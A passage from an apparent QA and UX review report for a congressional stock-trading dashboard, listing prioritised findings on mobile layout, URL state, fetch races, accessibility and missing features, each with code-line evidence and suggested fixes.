- **Fix:** Return 404 from the analytics member route when profileRow is null and no transactions exist (same for ticker with no ref and 0 trades); in openMember/openAsset render 'Politician not found' / 'No trades for TICKER'.
- **Evidence:** Live curl 2026-08-19: `/api/analytics/member/NOPE?window=all` -> HTTP 200 `{"filerId":"NOPE","profile":null,"stats":{"totalTrades":0,...}}`; `/api/analytics/ticker/ZZZZ` -> HTTP 200 `{"ticker":"ZZZZ","ref":null,"name":"ZZZZ",...}`. Contrast: `/api/client/v1/member/NOPE` -> HTTP 404 `member not found` (also reproduced live). UI: origin/main dashboardHtml.ts:11216-11217 `var p = d.profile || {}; var name = fmtName(p.fullName || filerId);` confirmed exact, so an unknown id renders a drawer titled with the raw id and all-zero stats instead of a not-found state.
- **Panel:** qa-bughunt — Reproduced live exactly: both analytics endpoints return 200 with null profile/ref while the client/v1 endpoint correctly 404s for the same bad id, confirming the inconsistency. · `qa-bughunt/QABUGHUNT-19`

#### 297. [P3] Search inputs lack type=search / enterkeyhint / autocorrect=off / autocapitalize=off — iOS keyboard autocorrects tickers and shows 'return' instead of 'Search'

- **Where:** app/src/ui/dashboardHtml.ts:2775 (#qSearch), :3067 (#peopleQ), :3168-3169 (#newTickers/#newMembers)  ·  **Surface:** Web · mobile  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** iOS capitalises the first letter, autocorrects lowercase tickers, offers no clear (×) button, and the return key is not labelled Search; a CSV of tickers gets auto-capitalised/auto-corrected.
- **Impact:** Friction typing tickers/names on phones; typos in delivery filters.
- **Fix:** Add `type="search" enterkeyhint="search" autocorrect="off" autocapitalize="off" spellcheck="false"` (and `autocapitalize="characters"` for #newTickers).
- **Evidence:** dashboardHtml.ts:2775 `<input id="qSearch" class="icon-input" placeholder="Search name, ticker, state, party…" … oninput="handleTradesTextFilter()" />`; :3067 `<input id="peopleQ" placeholder="Search name, state, party… any order" …>`; :3168 `<input id="newTickers" placeholder="tickers (CSV, optional)" …>`. grep enterkeyhint|inputmode|autocapitalize|autocorrect in origin/main dashboardHtml.ts → 0 matches.
- **Panel:** web-mobile — Markup and grep verified on origin/main. · `web-mobile/WEBMOBILE-19`

#### 298. [P3] Hover-only titles on mobile cards: truncated company name, 'Official filed time', amount bracket live only in title attributes the tap-tooltip does not cover

- **Where:** app/src/ui/dashboardHtml.ts:12007-12024 (tap-tooltip handler), :4380 (.amount-cell title), :4426 (.fc-filed title)  ·  **Surface:** Web · mobile  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** On desktop the meaning of '9d ago' (filed, not traded) and the full company name are a hover away; on phones they are unreachable — the card must be opened to learn the company name.
- **Impact:** Ambiguous timestamps and truncated names on the primary mobile list.
- **Fix:** Label the relative time inline on phones ('filed 9d ago'), let the company name wrap to two lines in cards, and add `data-tip` to any title that matters on touch (or make the click path use tipTextFor()).
- **Evidence:** mobile/trades.png: 'VSNT Versant Me…', 'MDLZ Mondelez I…' truncated. tradesCardHtml :4426 `<span class="fc-filed" title="Official filed time">`, :4431 `title="Open trade details"`, assetCellHtml :4350 `<div title="'+esc((r.ticker ? r.ticker + '  |  ' : '') + (nm || ''))+'">`, amountCellHtml :4416 `title="' + esc(tier.title + '  |  ' + text)`. Tap-to-reveal handler :12009-12045: the click path uses `e.target.closest('[data-tip],.info-tip,.est-money')` (:12026) so `title`-only elements never pop on touch (the helper `tipTextFor()` at :12012 that includes `[title]` is never called).
- **Panel:** web-mobile — Line refs corrected (:4426/:4431/:4350/:4416; handler :12009-12045).  Confirmed the click selector omits [title]. · `web-mobile/WEBMOBILE-20`

#### 299. [P3] Trades toolbar wraps to three control rows below ~375px (Sort row, pager, rows-select on separate lines)

- **Where:** app/src/ui/dashboardHtml.ts:2788 (.pager.pager-top), :1956-1958 (pager-top rules)  ·  **Surface:** Web · mobile  ·  **Category:** design  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Below ~375px the top band spends ~140px on three staggered rows before the first card; the rows-per-page select orphaned on its own line looks unintentional.
- **Impact:** Wasted vertical space and untidy layout on common small Android widths.
- **Fix:** Move rows-per-page into the ⋯ options menu on phones (as before) or place Sort + Rows in one row and the pager in the sticky footer.
- **Evidence:** Live 320x568 screenshot: row1 'Sort [Date] [▼] … 1-50 of 2,178', row2 pager buttons right-aligned, row3 '50 rows' select alone at left (reviewer saw the same at 360x780). CSS :1952-1958 `.pager.row-flex { align-items: center; flex-wrap: wrap; gap: 10px 12px; justify-content: space-between; }`, `.pager-top .pager-tools { display: flex; }`, `.pager-top .feed-options { display: none; }`.
- **Panel:** web-mobile — Reproduced visually at 320px on live; CSS quoted. · `web-mobile/WEBMOBILE-25`

#### 300. [P3] Tablet width (769–1024px, non-touch) shows the desktop Trades table with the Country column clipped and no scroll cue

- **Where:** app/src/ui/dashboardHtml.ts:222 (.table-wrap), :1821 (breakpoint gate)  ·  **Surface:** Web · mobile  ·  **Category:** design  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Between the phone block (≤768) and desktop there is effectively no layout: the 6-column resizable table overflows, and (per WEBMOBILE-09) touch tablets get the phone layout instead, so no tablet ever gets a fitted table.
- **Impact:** iPad-in-Chrome / small laptops / split-view see clipped data.
- **Fix:** Add a 769–1024 rule: hide Country/Sector by default, allow horizontal scroll with visible edge fade, keep 12px main padding.
- **Evidence:** Live 820x1180 (non-touch): `#view-trades .table-wrap` right edge 785, scrollWidth 867 vs clientWidth 750; header right edges Date 136 / Type 232 / Politician 427 / Asset 674 / Amount 782 / Country 902 — Country is past the viewport, reachable only by an uncued horizontal scroll. NOTES.md:469 'No tablet breakpoint (~768–1024 px) was captured'. Only :865 `@media (min-width: 769px) and (max-width: 900px) { .toolbar { flex-wrap: wrap; } … }` targets this range.
- **Panel:** web-mobile — Reproduced on live at 820px; the wrap does have ~35px right margin and is scrollable, so wording tightened to 'clipped with no cue'. · `web-mobile/WEBMOBILE-26`

#### 304. [P3] Directory state (People/Assets mode, search text, branch, sort) is never written to the URL — directory searches are not linkable and refresh resets them

- **Where:** app/src/ui/dashboardHtml.ts:9837-9875  ·  **Surface:** Web  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Unlike Trades (`?fq=`), the Directory cannot be deep-linked to a search, an Assets view or a sort; sharing "Senate Republicans sorted by trades" is impossible.
- **Impact:** Lost shareability/bookmarks; inconsistency with Trades.
- **Fix:** Mirror `dm=assets`, `dq=`, `dch=`, `dsort=` into the URL and restore on boot.
- **Evidence:** dashboardHtml.ts@origin/main:9840-9868 setDirectoryMode and :9869-9872 filterDirectory never call syncFilterUrl/replaceState; syncFilterUrl (5387-5405) only knows fq/ft/fm/fty/fpa/fch/fw; `grep -n "'dm'\|'dq'"` → nothing.  NOTES.md (a): "Typing in the Directory search box filters live … but does not update the URL"; desktop/directory-search-pelosi.png URL still `/?view=people`.
- **Panel:** web-ux-desktop — Code confirmed; no directory params in syncFilterUrl or anywhere else. · merged: seo-social/SEOSOCIAL-26, qa-bughunt/QABUGHUNT-27 · `web-ux-desktop/WEBUXDESKTOP-10`

#### 305. [P3] Empty state "No transactions match these filters." offers no Clear-filters action

- **Where:** app/src/ui/dashboardHtml.ts:4803-4804  ·  **Surface:** Web  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** After stacking Past Day + Executive + Sells + a search term, the user must undo each control by hand to recover.
- **Impact:** Recovery friction; common with narrow windows.
- **Fix:** Add a "Clear filters" button (and "Widen to All Time") in the empty-state row; also on Trends when the KPI tiles are all zero.
- **Evidence:** dashboardHtml.ts@origin/main:4802-4805 `if (rows.length === 0) { body.innerHTML = stateRow(cols.length, 'No transactions match these filters.'); …}` — plain text row; the active filters live in four separate controls (window, branch, party, side) plus search.
- **Panel:** web-ux-desktop — Code quoted at 4802-4805. · merged: growth-onboarding/GROWTHONBOARDING-18, ux-copy/UXCOPY-24 · `web-ux-desktop/WEBUXDESKTOP-20`

#### 306. [P3] Live poll silently prepends new rows and re-sorts page 1 under the reader

- **Where:** app/src/ui/dashboardHtml.ts:5487-5514  ·  **Surface:** Web  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** When a filing lands, rows shift down (and the last rows drop off) while someone is reading, with no notice; there is no "3 new trades — show" affordance.
- **Impact:** Content jumps; users lose their place or miss that something arrived.
- **Fix:** Buffer new rows and show a "N new trades" pill/toast that inserts on click; only auto-insert when the container is scrolled to top.
- **Evidence:** dashboardHtml.ts@origin/main:5487-5518 fetchUpdates → `TRADES = sortRows(txs.concat(TRADES)).slice(0, tradesPageSize); setTradesKpis(); renderTrades();` with no "N new" pill; NOTES.md (c): background poll every ~10–30 s.
- **Panel:** web-ux-desktop — fetchUpdates quoted verbatim. · `web-ux-desktop/WEBUXDESKTOP-21`

#### 307. [P3] Filter chips are icon + "All" with no visible category label; the side chip has no text at all when unset

- **Where:** app/src/ui/dashboardHtml.ts:2740-2769 (ios-filter chip markup)  ·  **Surface:** Web · desktop  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Status:** new
- **What:** Two identical "All" pills and an arrow-only pill do not say what they filter until opened; discoverability of the whole filter model depends on guessing emoji.
- **Impact:** First-time users miss the branch/party/side filters entirely.
- **Fix:** Show the label when unset ("Branch: All", "Party: All", "Side: All") or use a text prefix; there is room on desktop.
- **Evidence:** dashboardHtml.ts@origin/main:2734-2737 branch chip `🏛` + `<span data-ios-summary>All</span>` (aria-label "Filter by branch"), :2748-2751 party chip `👥` + `All`, :2760-2762 side chip `▲▼⇄` + empty `data-ios-summary`.  desktop/home.png shows three chips reading "All", "All", "▲▼⇄"; lighthouse/SUMMARY.txt label-content-name-mismatch fails on trends/trades desktop (14 items).
- **Panel:** web-ux-desktop — Markup and home.png confirmed.  Did not verify that the 14 Lighthouse mismatch items are exactly these chips. · merged: prior-review-followup/PRIORREVIEWFOLLOWUP-14 · `web-ux-desktop/WEBUXDESKTOP-28`

#### 308. [P3] Brand logo is not a home link and primary tabs are buttons, not links (no hover URL, no middle-click/new-tab, no right-click Copy Link)

- **Where:** app/src/ui/dashboardHtml.ts:2691-2699  ·  **Surface:** Web · desktop  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Clicking the logo does nothing; users cannot open Directory in a new tab or copy a tab's URL from the nav.
- **Impact:** Universal web conventions broken; also weakens crawlability of the four views.
- **Fix:** Wrap the logo in `<a href="/">`; render tabs as `<a href="/?view=…">` with click interception for SPA behaviour.
- **Evidence:** dashboardHtml.ts@origin/main:2692-2693 `<div class="brand" aria-label="Congress.Trade"><img class="brand-logo" …>` (no <a>, no onclick); :2694-2701 `<nav class="tabs" role="tablist">` of `<button data-view=…>`; only 7 `<a>` on the page (page-metrics.txt).
- **Panel:** web-ux-desktop — Markup quoted at 2692-2701; no brand onclick found. · `web-ux-desktop/WEBUXDESKTOP-31`

#### 309. [P3] Directory first paint is a text "Loading directory…" row with no skeleton (still open from 2026-08-10)

- **Where:** app/src/ui/dashboardHtml.ts:3081, 3091  ·  **Surface:** Web  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Status:** still-open-since-2026-08-10 (docs/reviews/2026-08-10-web-ui-expert-review.md P1-5)
- **What:** Trends and Trades show skeletons; the Directory shows a one-line text row then jumps to 381 rows.
- **Impact:** Perceived slowness and layout jump on a frequently visited tab.
- **Fix:** Use skRows(12, 3) while loading and keep the header visible.
- **Evidence:** dashboardHtml.ts@origin/main:3082 and :3091 `<tbody id="peopleBody"><tr><td colspan="3" class="state">Loading directory…</td></tr></tbody>`; :9682 and :9896 loadPeopleDirectory/loadAssetsDirectory set `stateRow(3, 'Loading directory…')`; skRows() is used on Trends (10505, 10546, 10573, 10647) but never in the Directory loaders.
- **Panel:** web-ux-desktop — Code and prior review P1-5 (docs/reviews/2026-08-10-web-ui-expert-review.md:120-125) confirmed. · merged: prior-review-followup/PRIORREVIEWFOLLOWUP-13 · `web-ux-desktop/WEBUXDESKTOP-34`

#### 310. [P3] Trades sort key, sort direction and page number are not in the URL — refresh or share resets to page 1, date desc

- **Where:** app/src/ui/dashboardHtml.ts:5387-5405  ·  **Surface:** Web  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** A reader on page 7 sorted by Seen who reloads (or shares) is dropped back to page 1 default sort.
- **Impact:** Lost position; unshareable table state.
- **Fix:** Add `p=`, `sort=`, `dir=` (and rows) to the URL sync and restore on boot.
- **Evidence:** dashboardHtml.ts@origin/main:5387-5405 syncFilterUrl pairs = fq/ft/fm/fty/fpa/fch/fw only; tradesPage/tradesPageSize (:3495-3496) and sortKey/sortDir (:3518-3519) are never serialized or read back from the URL.
- **Panel:** web-ux-desktop — Fixed line references (3495-3496, 3518-3519); syncFilterUrl quoted. · `web-ux-desktop/WEBUXDESKTOP-44`

#### 327. [P3] ~25% of the phone viewport is permanently sticky chrome on Trades (52px header + ~100px filters/search + 58px tab bar); >50% in landscape

- **Where:** app/src/ui/dashboardHtml.ts:1827 (--ct-header-h:52px), :1976 (#tradesToolbars sticky)  ·  **Surface:** Web · mobile  ·  **Category:** ux  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** Header, the toolbar rows and the dock never scroll away; the sort/pager row adds another ~50px before the first card.  Real Safari adds its own ~130px, so ~500px remains for content in portrait and very little in landscape.
- **Impact:** Less content per screen, more scrolling; landscape nearly unusable.
- **Fix:** Collapse the header (or the filter row) on scroll-down and restore on scroll-up; unstick #tradesToolbars in the landscape query; consider merging search into the filter row.
- **Evidence:** Live 390x844: header.top 52px (sticky), #tradesToolbars 99.5px (sticky, :1977-1982 `position: sticky; top: var(--ct-header-h, 52px)`), nav.tabs 58px (fixed, :1837-1850) → 209.5px = 24.8%. Landscape block :2095-2106 only trims padding (`header.top { padding:8px 10px; }`, `.drawer-panel { height:92vh; }`), the toolbars stay sticky.
- **Panel:** web-mobile — 52 / 99.5 / 58 reproduced on live; landscape only reasoned from :2095-2106. · `web-mobile/WEBMOBILE-12`

#### 328. [P3] PWA manifest theme/background are dark navy (#08111f) while the product default is light (#eff3f8): dark splash + dark Android title bar on a light app; no service worker

- **Where:** app/src/ui/assets.ts:61-70 (SITE_WEBMANIFEST)  ·  **Surface:** Web · mobile  ·  **Category:** design  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** Add-to-Home-Screen on Android shows a navy splash and navy status/title bar, then a white app; no offline shell or install prompt path.
- **Impact:** Inconsistent installed-app polish; missed re-engagement (installable app icon) on Android.
- **Fix:** Set manifest background/theme to the light palette (or supply both), add a minimal service worker (cache shell + last trades JSON), and `apple-mobile-web-app-status-bar-style`.
- **Evidence:** assets.ts:62-73 `background_color: '#08111f', theme_color: '#08111f', display: 'standalone'`; live /site.webmanifest returns the same. dashboardHtml.ts:105 `<meta name="theme-color" content="#eff3f8" />` and :131-146 default theme 'light'. grep 'serviceWorker' in origin/main dashboardHtml.ts and live HTML → 0. No `apple-mobile-web-app-status-bar-style` meta.
- **Panel:** web-mobile — Manifest fetched live; meta and grep verified. · `web-mobile/WEBMOBILE-17`

#### 329. [P3] Bottom sheets have no drag handle, no swipe-to-dismiss, no role=dialog/aria-modal; Close is a button at the top of an 88vh sheet (out of thumb reach)

- **Where:** app/src/ui/dashboardHtml.ts:3421-3424  ·  **Surface:** Web · mobile  ·  **Category:** ux  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** Native-feeling sheets (and the iOS app) dismiss by swiping down; here the only exits are a top-right ✕ far from the thumb or a thin backdrop strip.  Screen readers are not told a modal opened.
- **Impact:** Harder one-handed dismissal; a11y gap on mobile screen readers.
- **Fix:** Add a grabber, `role="dialog" aria-modal="true"`, a simple pointer-drag-down-to-close (or a bottom 'Done' bar), and treat Back as close (see WEBMOBILE-06).
- **Evidence:** mobile/trades-row-expanded.png, member.png, ticker.png: ✕ at top-right, no grabber. dashboardHtml.ts:3421-3424 `<div class="drawer" id="detailDrawer"><div class="drawer-backdrop" onclick="closeDrawer()"></div><div class="drawer-panel">…<button class="drawer-close" onclick="closeDrawer()" aria-label="Close">✕</button>` — no role/aria-modal (NOTES.md:98; the Sign In / Premium modals at :3428/:3448 do have role=dialog aria-modal). grep touchstart|pointerdown → 0. Backdrop is only the top 12% of the screen (:2062 height 88vh).
- **Panel:** web-mobile — Markup and greps verified; a11y tree mobile/trades-row-expanded-a11y.txt shows the Close button but no dialog role. · `web-mobile/WEBMOBILE-21`

#### 331. [P3] Directory renders all 381 people (4,160 assets) inside a 70vh inner scroll box with no pager, no letter index and no party filter

- **Where:** app/src/ui/dashboardHtml.ts:682-687  ·  **Surface:** Web · desktop  ·  **Category:** ux  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** Browsing the roster means scrolling a nested box through hundreds of rows; there is no page size/pager (as Trades has), no A–Z jump, and no Party dropdown even though the intro copy invites party lookups.
- **Impact:** Scanability and cross-platform consistency (iOS has a pager).
- **Fix:** Add a Party select next to Branch, reuse the Trades pager/rows-per-page control, and let the table flow in the page.
- **Evidence:** dashboardHtml.ts@origin/main:682-687 `.people-table-wrap { max-height: min(70vh, 720px); overflow-x: hidden; overflow-y: auto; }`; :3068-3073 the only structured filter is `#peopleChamber` (All Branches/House/Senate/Executive); party is only reachable through free text.  desktop/directory-full.png shows the box clipping after ~13 rows with "381 of 381 politicians" below it.  iOS got a Directory pager in #1884; web did not.
- **Panel:** web-ux-desktop — Fixed CSS line reference (682-687, not 654-660); markup confirmed at 3068-3073. · merged: visual-design/VISUALDESIGN-31 · `web-ux-desktop/WEBUXDESKTOP-11`

#### 348. [P3] loadTrends fires 13 unsequenced fetches; rapid filter toggles can leave sections showing the previous filter's data

- **Where:** app/src/ui/dashboardHtml.ts:9542-9548  ·  **Surface:** Web  ·  **Category:** bug  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)
- **What:** Classic out-of-order response race across 13 independent panels.
- **Impact:** Silently inconsistent dashboards (filter says one thing, numbers another).
- **Fix:** Introduce a `trendsSeq` counter captured per loadTrends() call and drop responses whose seq is stale (pattern already used by fetchPage :5312-5319).
- **Evidence:** origin/main dashboardHtml.ts:9542-9548 confirmed byte-for-byte: `function loadTrends() { stampWindowChips(); loadTrSummary(); loadTrTickers(); loadTrTrending(); loadTrClusters(); loadTrTime(); loadTrSectorFlow(); loadTrCapFlow(); loadTrPerformers(); loadTrMembers(); loadTrParties(); loadTrSectors(); loadTrLag(); loadTrConflicts(); }` — 13 independent loader calls confirmed, each an `aGet(...).then(...)` with no request-sequence token and no `AbortController`; `aGet` (function at 9333) caches per-path and can resolve instantly from cache for a repeated window.
- **Panel:** qa-bughunt — Directly observed in code: no sequence guard or abort mechanism exists across any of the 13 loaders, which is the defect being reported (the resulting stale-render race itself was not live-reproduced, consistent with the original medium confidence rating, but the missing-guard fact is confirmed, not merely inferred). · `qa-bughunt/QABUGHUNT-16`

#### 349. [P3] Background poll (fetchUpdates) is not sequence-guarded or filter-matched: an in-flight poll started under old filters can merge rows into a freshly filtered page

- **Where:** app/src/ui/dashboardHtml.ts:5487-5516  ·  **Surface:** Web  ·  **Category:** bug  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)
- **What:** A poll response that overlaps a filter change or a page fetch merges rows from the previous query into the new one.
- **Impact:** Occasional out-of-filter rows / totals on the Trades page; hard to reproduce, easy to prevent.
- **Fix:** Capture `tradesRequestSeq` at poll start and discard on mismatch; run merged rows through makeTradesFilterMatcher(); only merge when sortKey is a backend sort.
- **Evidence:** origin/main dashboardHtml.ts:5487-5517 confirmed exact (function `fetchUpdates`): builds params once via `tradesFilterParams()` at request time, then on response `txs.forEach(rememberTradeRow); txs.reverse(); TRADES = sortRows(txs.concat(TRADES)).slice(0, tradesPageSize); ... renderTrades();` — no check against a `tradesRequestSeq`-style counter and no call to `makeTradesFilterMatcher()` on the merged rows before rendering (the SSE path does apply a matcher, per NOTES.md, but this poll path does not). Guard is only `if (loadingPage || tradesPage !== 0) return` — protects against pagination overlap, not a filter change mid-flight.
- **Panel:** qa-bughunt — fetchUpdates function body read in full at origin/main:5487-5517; confirmed the absence of both a sequence guard and a filter-matcher application before merging, which is the defect itself.  The downstream race scenario was not live-reproduced (matches original medium confidence), but the missing-safeguard fact is directly observed, not inferred. · `qa-bughunt/QABUGHUNT-17`

#### 361. [P3] env(safe-area-inset-*) is used throughout but the viewport meta lacks viewport-fit=cover, so the insets always resolve to 0

- **Where:** app/src/ui/dashboardHtml.ts (viewport meta tag, no viewport-fit)  ·  **Surface:** Web · mobile  ·  **Category:** bug  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)
- **What:** The code intends to clear the home indicator in standalone mode and the notch in landscape, but without viewport-fit=cover the insets are always 0.  In Safari browser mode Safari's own toolbar masks this; in an installed web app (manifest display:standalone, assets.ts:68) the fixed tab bar sits flush against the home indicator with 4px padding.
- **Impact:** Installed-PWA and landscape users get the tab bar/CTA under the home indicator; the existing safe-area work is dead code.
- **Fix:** Add `viewport-fit=cover` to the viewport meta (both templates) and verify the header/tab bar in standalone mode; keep the fallbacks.
- **Evidence:** dashboardHtml.ts:101 `<meta name="viewport" content="width=device-width, initial-scale=1" />` (legalHtml.ts:123 same); live HTML contains no `viewport-fit`. Consumers: :1841 `padding-bottom: calc(4px + env(safe-area-inset-bottom, 0px))`, :1892, :1904, :2004, :2062, :2076, :2098, :2105. WebKit only reports non-zero safe-area insets when viewport-fit=cover.
- **Panel:** web-mobile — Meta and env() consumers verified in origin/main and live HTML; the zero-inset consequence is WebKit-documented behaviour, not observed on device. · `web-mobile/WEBMOBILE-16`

#### 362. [P3] Base body text is 13px on phones with 10–12px meta/table text — below comfortable mobile reading size

- **Where:** app/src/ui/dashboardHtml.ts:1826  ·  **Surface:** Web · mobile  ·  **Category:** a11y  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)
- **What:** Most reading text on phones is 12–13px; card meta and table cells 11–12px.  Combined with the failed webfont this reads small and thin on OLED phones.
- **Impact:** Legibility for a data-dense finance site; users zoom.
- **Fix:** Raise mobile body to 15px and card/table text to 13–14px; fix the fonts.googleapis URL (Source Serif 4 tuple) so Inter loads, or self-host.
- **Evidence:** Live 390px computed body font-size 13px; dashboardHtml.ts:1826 `body { background: var(--bg); font-size: 13px; }`; :536 `.fc-row2 { font-size: 12px }`; :1909 `.card .k { font-size:11px }`; :2092 `.people-table-wrap td { font-size: 12px }` (measured 12px); :1875 tab labels `font-size: 10px`. Fonts never load (Google Fonts CSS 400 / ORB-blocked, page-metrics + NOTES (c)) so this renders in the fallback system font.
- **Panel:** web-mobile — Sizes reproduced on live; 'comfortable' threshold is judgement, hence P3/medium retained. · `web-mobile/WEBMOBILE-24`

#### 364. [P3] Default Trades columns show low-value Country while Chamber, Party, Official Filed and Lag are hidden

- **Where:** app/src/ui/dashboardHtml.ts:4483-4498  ·  **Surface:** Web · desktop  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)
- **What:** The product's differentiator (filing speed / disclosure lag) and basic identity (House/Senate, party) are hidden behind ⋯ → Columns, while an almost-constant Country column takes the space.
- **Impact:** Scanability; users cannot tell senators from representatives or see lag without opening every row.
- **Fix:** Default on: Chamber (or a party/chamber token in the Politician cell), Official Filed and Lag; default off: Country.
- **Evidence:** dashboardHtml.ts@origin/main:4484-4504 TRADES_COLS: `country … def: true`, `filed … def: false`, `lag … def: false`, `chamber … def: false`; desktop/trades-bottom.png Country column is "US" or "—" on every visible row; the politician cell reads "Ro Khanna | CA" with no chamber/party.
- **Panel:** web-ux-desktop — TRADES_COLS defaults quoted; screenshot confirms Country is US/— throughout. · `web-ux-desktop/WEBUXDESKTOP-32`

#### 378. [P3] No Watchlist/follow on web although the backend stores a per-user watchlist and iOS exposes it

- **Where:** app/src/ui/dashboardHtml.ts (no watchlist UI)  ·  **Surface:** Cross-surface  ·  **Category:** ux  ·  **Effort:** M  ·  **Verdict:** confirmed (medium confidence)
- **What:** A signed-in user cannot pin tickers/politicians on the web or see a "my watchlist" filter, so "follow a ticker" has no persistent path on desktop.
- **Impact:** Feature parity gap; weakens sign-in value on web.
- **Fix:** Add a ★ toggle in ticker/member drawers writing to the existing preferences endpoint, plus a "Watchlist" chip on Trades/Trends.
- **Evidence:** client/commands.ts@origin/main:66 `if (input.watchlist !== undefined) patch.watchlist = arrayOfStrings(input.watchlist, { upper: true }) ?? []`; admin/routes.ts@origin/main:8696 `watchlist TEXT NOT NULL DEFAULT '[]'`; iOS Delivery tab shows a Watchlist section (ios NOTES §5).  `grep -in watchlist dashboardHtml.ts` → no hits.
- **Panel:** web-ux-desktop — Both backend references verified at the cited lines; zero 'watchlist' hits in dashboardHtml.ts. · `web-ux-desktop/WEBUXDESKTOP-16`

#### 379. [P3] Delivery create form takes members/tickers as free-text CSV with no autocomplete or validation feedback

- **Where:** app/src/ui/dashboardHtml.ts:3168-3169  ·  **Surface:** Web · desktop  ·  **Category:** ux  ·  **Effort:** M  ·  **Verdict:** confirmed (medium confidence)
- **What:** Users must guess exact spellings/ids; a typo silently produces a delivery that never fires.
- **Impact:** Silent misconfiguration of a paid feature.
- **Fix:** Reuse the Directory roster (already cached client-side) for a chip-style typeahead on both fields and echo resolved names before saving.
- **Evidence:** dashboardHtml.ts@origin/main:3167-3168 `<input id="newTickers" placeholder="tickers (CSV, optional)">`, `<input id="newMembers" placeholder="members (names/ids, optional)">`; `grep -n "<datalist"` → none in the file.
- **Panel:** web-ux-desktop — Markup quoted; no datalist/typeahead in the file.  Server-side name resolution on save was not audited (signed-in path unavailable). · `web-ux-desktop/WEBUXDESKTOP-27`

#### 415. [P4] 'Copy link' in sheets is an href-less <a> using clipboard only — no Web Share on phones, not focusable

- **Where:** Bottom of every trade/member/ticker sheet  ·  **Surface:** Web · mobile  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** On phones the natural action is the OS share sheet; the site only copies to clipboard with a toast, and the control is an unfocusable anchor.
- **Impact:** Missed sharing/growth on mobile; a11y gap.
- **Fix:** Render a `<button>`; if `navigator.share` exists call it with the deep link (title/text), else fall back to clipboard.
- **Evidence:** dashboardHtml.ts:10863 `function copyLinkHtml(param, value, label) { return '<a class="drawer-all-link clickable" data-copy-param="…" data-copy-value="…">🔗 ' + esc(label) + '</a>'; }` (no href) and the click handler at :10866-10872 → copyText(u.toString()); grep navigator.share → 0. NOTES.md:103 'The "Copy link to …" control … is an <a> with no href'.
- **Panel:** web-mobile — Function and grep verified on origin/main (line ref added: :10863). · `web-mobile/WEBMOBILE-29`

#### 418. [P4] Trade drawer has no previous/next navigation, so stepping through a filing's trades means close → find row → reopen

- **Where:** Trade drawer  ·  **Surface:** Web · desktop  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Kevin Hern's seven 8-5-26 sells (desktop/trades.png) must each be opened from the table separately.
- **Impact:** Slower review of multi-row filings.
- **Fix:** Add ‹ › in the drawer top bar bound to the current TRADES index (and J/K keys).
- **Evidence:** dashboardHtml.ts@origin/main:3421-3423 drawer chrome = title + Close only; openTrade (:11330+) renders no prev/next (`grep -n "prevTrade\|nextTrade\|drawer-nav"` → nothing; only pager buttons at 2797/2799); TRADES array is in memory (renderTrades).
- **Panel:** web-ux-desktop — Grep confirms no prev/next in the drawer. · `web-ux-desktop/WEBUXDESKTOP-23`

#### 419. [P4] Snapshot KPI tiles (Trades / Politicians / Assets) are not clickable and don't drill into the Trades or Directory views

- **Where:** Trends → Snapshot  ·  **Surface:** Web · desktop  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** The most prominent numbers on the landing page invite a click ("2,178 trades") but do nothing.
- **Impact:** Missed navigation shortcut into the filtered Trades list.
- **Fix:** Make Trades → Trades tab (same filters), Politicians → Directory, Assets → Directory/Assets.
- **Evidence:** dashboardHtml.ts@origin/main:10537-10540 `kpi('Trades', d.totalTrades, TRENDS_TRADES_TIP) + kpi('Politicians', d.uniqueMembers) + kpi('Assets', d.uniqueTickers)`; kpi() (:9405-9408) emits a plain `<div class="card">` with no click target; only Net Flow / Buy Pressure get `scrollToChart('trTime')`.
- **Panel:** web-ux-desktop — kpi() helper quoted; no click handler. · `web-ux-desktop/WEBUXDESKTOP-35`

#### 450. [P4] Anonymous Delivery page shows the full create form (disabled but not visibly so) beneath the sign-in gate

- **Where:** Delivery tab (#subsManage)  ·  **Surface:** Web · desktop  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** plausible (medium confidence)
- **What:** The gate does have a CTA, but the whole inert create form is still painted under it and (per the screenshot) barely reads as disabled; the gate copy also names Google only.
- **Impact:** Slightly confusing first impression of the paid feature.
- **Fix:** Collapse the form for anonymous users behind the gate card (or style disabled controls unmistakably) and say "Sign in" rather than "Sign in with Google".
- **Evidence:** dashboardHtml.ts@origin/main:3163-3199 every control carries `disabled`; updateDeliveryGate (:6688-6716) renders the gate "Sign in with Google to use Delivery.  Creating a webhook or SSE target requires a signed-in Premium account." + a Sign In button, and the page also carries a "Start Free Trial" line.  desktop/delivery-full.png: the SSE select, tickers/members inputs and Add New Delivery button render below the gate looking almost like live controls.
- **Panel:** web-ux-desktop — Downgraded P3→P4 and reworded: the gate carries a Sign In button and a Start Free Trial CTA (updateDeliveryGate 6712-6714, delivery-full.png), so 'no clear gate/CTA' was overstated.  Remaining issue is the inert form wall. · `web-ux-desktop/WEBUXDESKTOP-26`

